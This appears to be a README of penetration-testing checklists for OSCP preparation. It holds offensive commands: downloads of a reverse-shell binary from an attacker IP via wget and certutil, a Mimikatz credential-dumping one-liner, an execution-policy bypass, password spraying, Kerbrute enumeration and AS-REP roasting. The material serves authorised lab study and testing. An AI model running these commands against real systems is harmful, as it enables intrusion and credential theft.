# Penetration Testing Checklists and Cheatsheets

This repository contains various checklists and cheatsheets to aid in penetration testing and preparing for the Offensive Security OSCP exam.

## Table of Contents

1. [Commands Cheat Sheet](#commands-cheat-sheet)
2. [General Checklists](#general-checklists)
   - [General Checklist Before Starting](#general-checklist-before-starting)
   - [General Checklist for Web Applications](#general-checklist-for-web-applications)
3. [Detailed Checklists](#detailed-checklists)
   - [Web Application Pre-Authentication Checklist](#web-application-pre-authentication-checklist)
   - [Web Application Directory Enumeration Checklist](#web-application-directory-enumeration-checklist)
   - [Web Application Login Checklist](#web-application-login-checklist)
   - [Finding Vulnerabilities and Exploits Checklist](#finding-vulnerabilities-and-exploits-checklist)
   - [Network Discovery and Port Scan Checklist](#network-discovery-and-port-scan-checklist)
   - [Active Directory General Checklist](#active-directory-general-checklist)
   - [Active Directory with Credentials Checklist](#active-directory-with-credentials-checklist)
   - [Active Directory without Credentials Checklist](#active-directory-without-credentials-checklist)
   - [Active Directory Kerberos Checklist](#active-directory-kerberos-checklist)
   - [Active Directory Lateral and Vertical Movement Checklist](#active-directory-lateral-and-vertical-movement-checklist)
   - [Privilege Escalation Windows Checklist](#privilege-escalation-windows-checklist)
   - [Privilege Escalation Linux Checklist](#privilege-escalation-linux-checklist)
   - [Ligolo-ng Checklist](#ligolo-ng-checklist)

---

## Commands Cheat Sheet

### Full TTY

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
alias ls='ls -arlht --color=auto'
stty columns 200 rows 200
```

### Windows PowerShell Commands
EXECUTION POLICY
```
Set-ExecutionPolicy Unrestricted -Scope CurrentUser
powershell -ExecutionPolicy Bypass -File .\PowerView.ps1
```
Show file like with Tree
```
Get-ChildItem -Path "./*" -Include "*" -Recurse -ErrorAction SilentlyContinue
```
```
Get-ChildItem -Path "C:\Users\*" -Include "flag.txt", "local.txt", "user.txt", "password.txt", "proof.txt", "credentials.txt" -Recurse -ErrorAction SilentlyContinue
```
Download
```
wget http://192.168.123.100:8000/rev4445.exe -OutFile rev4445.exe
```
```
certutil -split -urlcache -f http://192.168.123.100:8000/agent.exe agent.exe
```
Mimikatz Oneliner
```
.\mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "vault::cred" "exit"
```
## General Checklists

### General Checklist Before Starting

1. Authenticate with credentials to BloodHound.
2. Perform quick enumeration in BloodHound.
3. Ensure you claim all flags and collect sufficient screenshots.
4. Check anonymous or guest access to SMB shares on all IPs as a good starting point.
5. Step back and attack the Domain Controller as if you do not have credentials.
6. Also try default credentials like `offsec:lab`.
7. Enumerate MS01 until the end, even if you have local admin—use WinPEAS as well.
8. If other credentials are found, repeat the enumeration phase.
9. Try using the username as the password (both domain and local).
10. Use `nxc smb 192.168.123.100 -u adcreds.txt -p adcreds.txt --no-bruteforce`.
11. Use `nxc smb 192.168.123.100-160 --local-auth -u adcreds.txt -p adcreds.txt --no-bruteforce`.
12. Check all shares with the current user, guest, and anonymous access.
13. Use `rpcdump` and `enum4linux` with credentials.
14. Enumerate users with Kerbrute:

    ```bash
    /Tools/kerbrute_linux_amd64 userenum -d domain.com --dc 192.168.123.100 $SECLIST/Usernames/Names/names.txt
    ```

15. Continue using Kerbrute until you have the naming schema, lots of users, and service accounts. Refer to [service-accounts.txt](https://github.com/crtvrffnrt/wordlists/blob/main/service-accounts.txt).
16. Request AS_REP messages:

    ```bash
    impacket-GetNPUsers domain.com/ -usersfile adcreds.txt -dc-ip 192.168.123.100 -request -outputfile hash.hash
    ```

    [ASREPRoast HackTricks Guide](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast#request-as_rep-message)

17. Perform a UDP scan.
18. Repeat your steps—**Enumeration is key; try harder.**
19. Run WinPEAS with user or local admin privileges again.
20. Connect to SMB with:

    ```bash
    impacket-smbclient domain.com/guest@192.168.123.100
    ```

21. Step back and review your enumeration to ensure nothing was missed.

### General Checklist for Web Applications

1. Disable any ad-blockers.
2. Find web servers in scope:

    ```bash
    nmap -vv -sV -p 80,443 --script http-title --open --min-rate 3000 -T4 192.168.123.100
    ```

3. Identify the tech stack using `whatweb`, `wappalyzer`, or `httpx`.
4. Check the website using [web-check.as93.net](https://web-check.as93.net/).
5. Use `feroxbuster` for directory enumeration:

    ```bash
    feroxbuster -u http://domain.com -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt
    ```

6. Search for PDFs:

    ```bash
    feroxbuster -u http://192.168.123.100/ -w $SECLIST/Discovery/Web-Content/raft-large-words.txt -x pdf -q | grep '\.pdf$'
    ```

7. Scan with Nessus, Nuclei, Nikto, or Sn1per.
8. Check network interactions via browser DevTools.
9. Perform a Burp Suite Pro scan.
10. Enumerate subdomains:

    ```bash
    echo domain.com | subfinder -silent | httpx -silent -sc -title -td -ip -cname -cl -lc -server -efqdn -fr
    ```

11. Create a list of directories using Burp Suite and input them to `feroxbuster` to get a comprehensive sitemap.
12. Find exploits using Sploitus, SearchSploit, and CVEMap.
13. Check for LFI/RFI vulnerabilities.
14. Proceed to the [Web Application Login Checklist](#web-application-login-checklist).
15. Attempt to brute-force the login page.
16. Try different usernames.
17. Check if there is a Git repository.
18. Revert the machine if necessary.
19. Remember, **Enumeration is key; step back and try harder.**
20. Verify all findings and ensure no steps were missed.

